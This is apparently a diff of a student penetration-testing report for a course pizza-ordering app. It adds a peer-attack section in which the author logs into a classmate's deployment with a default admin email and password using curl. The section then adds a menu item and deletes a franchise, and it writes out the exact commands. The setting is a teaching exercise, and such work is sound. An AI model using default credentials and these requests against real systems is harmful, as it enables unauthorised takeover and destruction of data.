@@ -22,7 +22,7 @@ If the attack had succeeded it would have been a severity 1 because I could have
 | Item           | Result                                                                         |
 | -------------- | ------------------------------------------------------------------------------ |
 | Date           | April 9, 2025                                                                  |
-| Target         | https://pizza-service.tesessa.click                                             |
+| Target         | https://pizza-service.tesessa.click                                            |
 | Classification | Injection                                                                      |
 | Severity       | 1                                                                              |
 | Description    | SQL injection failed                                                           |  
@@ -57,5 +57,27 @@ UPDATE user SET email='test@example.com', name='admin'
 
 I updated the updateUser function to use parameterized queries. This prevents SQL injection by ensuring user inputs are treated as data, not executable code.
 
+## 2. Peer Attacks
+## Tessa's attack on Lylah
+For this attack I knew about the default admin login vulnerability. So what I did was I logged in as her admin user using a curl request, then I updated the user immediately so I could have full accses, I changed the username and password. This made it so Lylah couldn't user her own admin username. Then I added an item to the menu, and deleted a franchise. This was all I did, it basically made the point that I could access all the data with the default admin.
 
+| Item           | Result                                                                         |
+| -------------- | ------------------------------------------------------------------------------ |
+| Date           | April 10, 2025                                                                 |
+| Target         | https://pizza-service.editnails260.click                                       |
+| Classification | Broken Access Control/Insecure Design                                          |
+| Severity       | 2                                                                              |
+| Description    | Deleted and added data with admin access                                       |  
+| Corrections    | Change admin user to have more secure password                                 |
 
+Here are the curl commands I used
+```console
+response=$(curl -s -X PUT $host/api/auth -d '{"email":"a@jwt.com", "password":"admin"}' -H 'Content-Type: application/json')
+token=$(echo $response | jq -r '.token')
+curl -X PUT $host/api/order/menu -H 'Content-Type: application/json' -d '{ "title": "Yummy", "description": "No topping, no sauce, just carbs", "image":"pizza9.png", "price": 0.0001 }'  -H "Authorization: Bearer $token"
+curl -X DELETE $host/api/franchise/1 -H "Authorization: Bearer $token"
+```
+This added one item to the menu and deleted a franchise, here is a screenshot of the result
+![Penetrationtest](penetrationTestingTessa.png)
+
+This attack could lead to the attacker deleting all the franchises and updating all the users which could be a problem with in the code
